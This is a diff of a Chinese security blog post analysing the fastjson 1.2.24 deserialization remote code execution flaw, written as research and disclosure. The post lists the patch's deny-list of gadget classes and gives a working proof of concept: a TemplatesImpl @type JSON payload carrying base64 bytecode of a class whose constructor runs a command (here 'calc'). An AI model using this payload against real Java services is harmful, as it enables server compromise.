@@ -5,7 +5,7 @@
   
 
 
-<html class="theme-next pisces use-motion" lang="zh-Hans">
+<html class="theme-next mist use-motion" lang="zh-Hans">
 <head>
   <meta charset="UTF-8"/>
 <meta http-equiv="X-UA-Compatible" content="IE=edge" />
@@ -20,6 +20,8 @@
 <meta http-equiv="Cache-Control" content="no-siteapp" />
 
 
+
+  <meta name="google-site-verification" content="eOKt_3ycRCL7ILr4F1AM1eilrWXcADidutENpULFpsE" />
 
 
 
@@ -74,12 +76,10 @@
 <link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="fastjson,反序列化,poc,java," />
 
 
 
-
-  
 
 
   <link rel="alternate" href="/atom.xml" title="xxlegend" type="application/atom+xml" />
@@ -94,18 +94,19 @@
 
 
 
-<meta name="description" content="fastjson 反序列化 poc 1.2.24  #1 背景 fastjson是一个java编写的高性能功能非常完善的JSON库，应用范围非常广，在github上star数都超过8k，在2017年3月15日，fastjson官方主动爆出fastjson在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。关于漏洞的具体详情可参考 https://">
+<meta name="description" content="fastjson 反序列化 poc 1.2.24  1 背景fastjson是一个java编写的高性能功能非常完善的JSON库，应用范围非常广，在github上star数都超过8k，在2017年3月15日，fastjson官方主动爆出fastjson在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。关于漏洞的具体详情可参考 https://gi">
+<meta name="keywords" content="fastjson,反序列化,poc,java">
 <meta property="og:type" content="article">
 <meta property="og:title" content="fastjson 远程反序列化poc的构造和分析">
 <meta property="og:url" content="http://yoursite.com/2017/04/29/title- fastjson 远程反序列化poc的构造和分析/index.html">
 <meta property="og:site_name" content="xxlegend">
-<meta property="og:description" content="fastjson 反序列化 poc 1.2.24  #1 背景 fastjson是一个java编写的高性能功能非常完善的JSON库，应用范围非常广，在github上star数都超过8k，在2017年3月15日，fastjson官方主动爆出fastjson在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。关于漏洞的具体详情可参考 https://">
+<meta property="og:description" content="fastjson 反序列化 poc 1.2.24  1 背景fastjson是一个java编写的高性能功能非常完善的JSON库，应用范围非常广，在github上star数都超过8k，在2017年3月15日，fastjson官方主动爆出fastjson在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。关于漏洞的具体详情可参考 https://gi">
 <meta property="og:image" content="http://yoursite.com/images/diaoyonglian.png">
 <meta property="og:image" content="http://yoursite.com/images/run-ok.png">
-<meta property="og:updated_time" content="2017-04-29T14:27:24.702Z">
+<meta property="og:updated_time" content="2017-05-01T06:13:51.074Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="fastjson 远程反序列化poc的构造和分析">
-<meta name="twitter:description" content="fastjson 反序列化 poc 1.2.24  #1 背景 fastjson是一个java编写的高性能功能非常完善的JSON库，应用范围非常广，在github上star数都超过8k，在2017年3月15日，fastjson官方主动爆出fastjson在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。关于漏洞的具体详情可参考 https://">
+<meta name="twitter:description" content="fastjson 反序列化 poc 1.2.24  1 背景fastjson是一个java编写的高性能功能非常完善的JSON库，应用范围非常广，在github上star数都超过8k，在2017年3月15日，fastjson官方主动爆出fastjson在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。关于漏洞的具体详情可参考 https://gi">
 <meta name="twitter:image" content="http://yoursite.com/images/diaoyonglian.png">
 
 
@@ -114,7 +115,7 @@
   var NexT = window.NexT || {};
   var CONFIG = {
     root: '/',
-    scheme: 'Pisces',
+    scheme: 'Mist',
     sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
     fancybox: true,
     motion: true,
@@ -221,6 +222,16 @@
         </li>
       
         
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
         <li class="menu-item menu-item-about">
           <a href="/about" rel="section">
             
@@ -237,6 +248,26 @@
               <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
             
             归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
           </a>
         </li>
       
@@ -350,6 +381,28 @@
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/java/" itemprop="url" rel="index">
+                    <span itemprop="name">java</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -398,15 +451,12 @@
       
         <p>fastjson 反序列化 poc 1.2.24</p>
 <hr>
-<p>#1 背景</p>
-<p>fastjson是一个java编写的高性能功能非常完善的JSON库，应用范围非常广，在github上star数都超过8k，在2017年3月15日，fastjson官方主动爆出fastjson在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。关于漏洞的具体详情可参考 <code>https://github.com/alibaba/fastjson/wiki/security_update_20170315</code></p>
-<p>#2 受影响的版本</p>
-<pre><code>fastjson &lt;= 1.2.24
-</code></pre><p>#3 静态分析</p>
-<p>根据官方给出的补丁文件，主要的更新在这个checkAutoType函数上，而这个函数的主要功能就是添加了黑名单，将一些常用的反序列化利用库都添加到黑名单中。具体包括<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework</div></pre></td></tr></table></figure></p>
+<h1 id="1-背景"><a href="#1-背景" class="headerlink" title="1 背景"></a>1 背景</h1><p>fastjson是一个java编写的高性能功能非常完善的JSON库，应用范围非常广，在github上star数都超过8k，在2017年3月15日，fastjson官方主动爆出fastjson在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。关于漏洞的具体详情可参考 <code>https://github.com/alibaba/fastjson/wiki/security_update_20170315</code></p>
+<h1 id="2-受影响的版本"><a href="#2-受影响的版本" class="headerlink" title="2 受影响的版本"></a>2 受影响的版本</h1><pre><code>fastjson &lt;= 1.2.24
+</code></pre><h1 id="3-静态分析"><a href="#3-静态分析" class="headerlink" title="3 静态分析"></a>3 静态分析</h1><p>根据官方给出的补丁文件，主要的更新在这个checkAutoType函数上，而这个函数的主要功能就是添加了黑名单，将一些常用的反序列化利用库都添加到黑名单中。具体包括<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework</div></pre></td></tr></table></figure></p>
 <p>下面我们来分析checkAutoType的函数实现：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</div><div class="line">        <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (typeName.length() &gt;= maxTypeNameLength) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">final</span> String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</div><div class="line">                String accept = acceptList[i];</div><div class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</div><div class="line">                    <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</div><div class="line">                String deny = denyList[i];</div><div class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</div><div class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</div><div class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</div><div class="line">            clazz = deserializers.findClass(typeName);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</div><div class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">return</span> clazz;</div><div class="line">        &#125;</div></pre></td></tr></table></figure></p>
 <p>核心部分就是denyList的处理过程，遍历denyList，如果引入的库以denyList中某个deny打头，就会抛出异常，中断运行。</p>
-<p>#4 POC构造<br>静态分析得知，要构造一个可用的poc，肯定得引入denyList的库。刚开始fastjson官方公布漏洞信息时，当时就尝试构造poc，怎奈fastjson的代码确实庞大，还有asm机制，通过asm机制生成的临时代码下不了断点。当时也只能通过在通过类初始化的时候弹出一个计算器，很显然这个构造方式不具有通用性，最近jackson爆出反序列漏洞，其中就利用了TemplatesImpl类，而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes生成java实例，简直不能再更妙，这就解决了fastjson通过字段传入一个类，再通过这个类执行有害代码。后来阅读ysoserial的代码时也发现在gadgets.java这个文件中也使用到了这个类来动态生成可执行命令的代码。下面是一个poc的代码</p>
+<h1 id="4-POC构造"><a href="#4-POC构造" class="headerlink" title="4 POC构造"></a>4 POC构造</h1><p>静态分析得知，要构造一个可用的poc，肯定得引入denyList的库。刚开始fastjson官方公布漏洞信息时，当时就尝试构造poc，怎奈fastjson的代码确实庞大，还有asm机制，通过asm机制生成的临时代码下不了断点。当时也只能通过在通过类初始化的时候弹出一个计算器，很显然这个构造方式不具有通用性，最近jackson爆出反序列漏洞，其中就利用了TemplatesImpl类，而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes生成java实例，简直不能再更妙，这就解决了fastjson通过字段传入一个类，再通过这个类执行有害代码。后来阅读ysoserial的代码时也发现在gadgets.java这个文件中也使用到了这个类来动态生成可执行命令的代码。下面是一个poc的代码</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</div><div class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</div><div class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</div><div class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</div><div class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</div><div class="line"></div><div class="line"><span class="keyword">import</span> java.io.IOException;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Test</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</div><div class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> </span>&#123;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">        Test t = <span class="keyword">new</span> Test();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>这个是Test.java的实现，在Test.java的构造函数中执行了一条命令，弹出计算器。编译Test.java得到Test.class供后续使用。后续会将Test.class的内容赋值给_bytecodes。接着分析poc</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> person;</div><div class="line"></div><div class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</div><div class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</div><div class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</div><div class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</div><div class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</div><div class="line"></div><div class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</div><div class="line"><span class="keyword">import</span> java.io.File;</div><div class="line"><span class="keyword">import</span> java.io.FileInputStream;</div><div class="line"><span class="keyword">import</span> java.io.IOException;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> * Created by web on 2017/4/29.</div><div class="line"> */</div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClass</span><span class="params">(String cls)</span></span>&#123;</div><div class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            IOUtils.copy(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(cls)), bos);</div><div class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title">test_autoTypeDeny</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</div><div class="line">        <span class="keyword">final</span> String fileSeparator = System.getProperty(<span class="string">"file.separator"</span>);</div><div class="line">        <span class="keyword">final</span> String evilClassPath = System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"\\target\\classes\\person\\Test.class"</span>;</div><div class="line">        String evilCode = readClass(evilClassPath);</div><div class="line">        <span class="keyword">final</span> String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</div><div class="line">        String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</div><div class="line">                <span class="string">"\",\"_bytecodes\":[\""</span>+evilCode+<span class="string">"\"],'_name':'a.b',\"_outputProperties\":&#123; &#125;,"</span> +</div><div class="line">                <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</div><div class="line">        System.out.println(text1);</div><div class="line">       </div><div class="line">        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</div><div class="line">        <span class="comment">//assertEquals(Model.class, obj.getClass());</span></div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            test_autoTypeDeny();</div><div class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
@@ -419,8 +469,7 @@
 <p>下面我们上一张调用链的图，<img src="/images/diaoyonglian.png" alt="调用链">,简单来说就是</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">JSON.parseObject</div><div class="line">...</div><div class="line">JavaBeanDeserializer.deserialze</div><div class="line">...</div><div class="line">FieldDeserializer.setValue</div><div class="line">...</div><div class="line">TemplatesImpl.getOutputProperties</div><div class="line">TemplatesImpl.newTransformer</div><div class="line">TemplatesImpl.getTransletInstance</div><div class="line">...</div><div class="line">Runtime.getRuntime().exec</div></pre></td></tr></table></figure>
 <p>附上一张成功执行图：<img src="/images/run-ok.png" alt="运行成功"></p>
-<p>#5 总结</p>
-<p>poc影响jdk 1.7，1.8版本，1.6未测试，但是需要在parseObject的时候设置Feature.SupportNonPublicField，最后给大家上个福利，github地址：完整的Intellij IDEA poc环境:</p>
+<h1 id="5-总结"><a href="#5-总结" class="headerlink" title="5 总结"></a>5 总结</h1><p>poc影响jdk 1.7，1.8版本，1.6未测试，但是需要在parseObject的时候设置Feature.SupportNonPublicField，最后给大家上个福利，github地址：完整的Intellij IDEA poc环境:</p>
 
       
     </div>
@@ -447,6 +496,18 @@
     </div>
 
     <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/fastjson/" rel="tag"># fastjson</a>
+          
+            <a href="/tags/反序列化/" rel="tag"># 反序列化</a>
+          
+            <a href="/tags/poc/" rel="tag"># poc</a>
+          
+            <a href="/tags/java/" rel="tag"># java</a>
+          
+        </div>
       
 
       
@@ -519,8 +580,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/avatar.png"
@@ -542,7 +612,25 @@
           
 
           
+            
+            
+            <div class="site-state-item site-state-categories">
+              
+                <span class="site-state-item-count">1</span>
+                <span class="site-state-item-name">分类</span>
+              
+            </div>
+          
 
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">4</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
           
 
         </nav>
@@ -601,6 +689,22 @@
       </section>
 
       
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-背景"><span class="nav-number">1.</span> <span class="nav-text">1 背景</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-受影响的版本"><span class="nav-number">2.</span> <span class="nav-text">2 受影响的版本</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-静态分析"><span class="nav-number">3.</span> <span class="nav-text">3 静态分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-POC构造"><span class="nav-number">4.</span> <span class="nav-text">4 POC构造</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-总结"><span class="nav-number">5.</span> <span class="nav-text">5 总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
 
       
 
@@ -632,7 +736,7 @@
 <div class="theme-info">
   主题 -
   <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
-    NexT.Pisces
+    NexT.Mist
   </a>
 </div>
 
@@ -712,13 +816,6 @@
   
   
 
-
-  <script type="text/javascript" src="/js/src/affix.js?v=5.1.1"></script>
-
-  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.1"></script>
-
-
-
   
   <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
 <script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
@@ -738,7 +835,7 @@
   
 
     
-      <script id="dsq-count-scr" src="https://xxlegend.com.disqus.com/count.js" async></script>
+      <script id="dsq-count-scr" src="https://xxlegend-com.disqus.com/count.js" async></script>
     
 
     
@@ -749,7 +846,7 @@
           this.page.title = 'fastjson 远程反序列化poc的构造和分析';
         };
         var d = document, s = d.createElement('script');
-        s.src = 'https://xxlegend.com.disqus.com/embed.js';
+        s.src = 'https://xxlegend-com.disqus.com/embed.js';
         s.setAttribute('data-timestamp', '' + +new Date());
         (d.head || d.body).appendChild(s);
       </script>
